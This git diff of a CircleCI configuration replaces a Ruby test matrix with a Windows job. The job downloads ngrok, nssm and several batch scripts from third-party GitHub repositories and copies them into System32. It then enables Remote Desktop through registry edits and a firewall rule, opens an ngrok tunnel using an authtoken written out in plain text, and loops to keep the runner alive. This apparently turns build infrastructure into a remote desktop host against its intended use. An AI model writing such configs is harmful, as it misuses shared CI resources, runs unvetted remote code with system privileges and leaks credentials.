@@ -1,57 +1,41 @@
-working_dir: &working_dir ~/app
+version: 2.1 
 
-.build_template: &build_definition
-  steps:
-    - checkout
-    - run: curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
-    - run: chmod +x ./cc-test-reporter
-    - run: ./cc-test-reporter before-build
-    - run: gem install bundler:2.1.4
-    - run: bundle install --jobs=4 --retry=4 --path vendor/bundle
-    - run: bundle exec rake rubocop
-    - run:
-        name: Run tests
-        command: |
-          bundle exec rspec -r rspec_junit_formatter --format RspecJunitFormatter -o $CIRCLE_TEST_REPORTS/rspec/junit.xml
-          ./cc-test-reporter after-build --exit-code $?
-  working_directory: *working_dir
-
-version: 2.0
+orbs:
+  win: circleci/windows@2.2.0
 
 jobs:
-  build:
-    docker:
-      - image: ruby
+  build: 
+    executor:
+      name: win/default 
+      size: "medium" 
+    
     steps:
-      - checkout
-  build_ruby2_7:
-    <<: *build_definition
-    docker:
-      - image: ruby:2.7
-  build_ruby2_6:
-    <<: *build_definition
-    docker:
-      - image: ruby:2.6
-  build_ruby2_5:
-    <<: *build_definition
-    docker:
-      - image: ruby:2.5
-  build_ruby2_4:
-    <<: *build_definition
-    docker:
-      - image: ruby:2.4
-  build_ruby2_3:
-    <<: *build_definition
-    docker:
-      - image: ruby:2.3
-
-workflows:
-  version: 2
-  build_ruby_versions:
-    jobs:
-      - build
-      - build_ruby2_7
-      - build_ruby2_6
-      - build_ruby2_5
-      - build_ruby2_4
-      - build_ruby2_3
+    - run: |
+        Set-Content authtoken.txt "1tzSWKjVzLTjxCzP8seWXir6Jyh_6W4sjWQjryVoHbXR7KyFa" #enter your ngrok authtoken from https://dashboard.ngrok.com/get-started/your-authtoken (if you don't have account, make one)
+        Set-Content region.txt "US" #enter region for the Ngrok servers (available: EU, US, JP, AP, SA) write one of them with capital letters
+    - run: |
+        Invoke-WebRequest https://raw.githubusercontent.com/tman10001/Windows2019RDP-AP/main/ngrok.exe -OutFile ngrok.exe
+        Invoke-WebRequest https://raw.githubusercontent.com/tman10001/Windows2019RDP-US/main/Files/nssm.exe -OutFile nssm.exe
+    - run: | 
+        copy nssm.exe C:\Windows\System32
+        copy ngrok.exe C:\Windows\System32
+        copy authtoken.txt C:\Windows\System32
+        copy region.txt C:\Windows\System32
+    - run: |
+        $authtoken = Get-Content authtoken.txt
+        .\ngrok.exe authtoken $authtoken
+    - run: |
+        $region = Get-Content region.txt
+        Invoke-WebRequest https://raw.githubusercontent.com/bEmcho-cyber/files/main/NGROK-$region.bat -Outfile NGROK-$region.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/bEmcho-cyber/files/main/NGROK-CHECK.bat -Outfile NGROK-CHECK.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/bEmcho-cyber/files/main/loop.bat -Outfile loop.bat
+    - run: |
+        $region = Get-Content region.txt
+        cmd /c NGROK-$region.bat
+    - run: |
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    - run: cmd /c sc start ngrok
+    - run: cmd /c NGROK-CHECK.bat
+    - run: cmd /c loop.bat
